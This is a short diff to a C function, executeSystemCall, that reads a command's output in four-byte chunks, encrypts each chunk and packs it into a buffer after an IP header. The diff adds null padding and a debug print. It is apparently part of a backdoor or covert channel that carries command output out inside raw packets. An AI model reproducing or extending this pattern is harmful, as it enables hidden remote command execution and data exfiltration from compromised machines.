@@ -51,7 +51,16 @@ void executeSystemCall(char *command)
     // Read from the stream
     while ((bytesRead = fread(line, sizeof(char), 4, results)) > 0)
     {
+        // Pad any extra space with NULL bytes
+        if (bytesRead != 4)
+        {
+            for (bytesRead; bytesRead < 4; bytesRead++)
+            {
+                line[bytesRead] = '\0';
+            }
+        }
         // Copy the line and encrypt it
+        fprintf(stderr, "%.4s", line);
         encryptedField = encrypt_data(line, date, bytesRead);
         memcpy(buffer + sizeof(struct ip) + 4, encryptedField, sizeof(unsigned long));
         
